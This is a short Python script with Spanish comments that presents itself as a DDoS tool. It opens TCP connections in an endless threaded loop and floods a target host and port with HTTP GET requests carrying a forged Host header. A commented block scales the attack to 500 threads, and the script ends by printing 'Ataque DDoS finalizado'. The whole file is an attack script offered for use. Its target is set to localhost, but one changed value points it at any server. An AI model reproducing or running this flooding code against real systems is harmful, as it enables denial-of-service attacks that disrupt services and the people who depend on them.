import socket
import threading

target_ip = "127.0.0.1"
target_port = 80  # Puerto del servicio en el objetivo
thread_count = 1  # Número de hilos para el ataque

fake_ip = '182.21.20.32'

def ddos():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    #client.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))

    client.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
    client.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))

    client.close()

def attack():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))

        # client.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))

        client.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        client.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))

        client.close()

# Iniciar los hilos de ataque
threads = []

for _ in range(thread_count):
    #thread = threading.Thread(target=ddos)
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()


"""
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
"""

# Esperar a que todos los hilos finalicen
for thread in threads:
    thread.join()

print("Ataque DDoS finalizado")
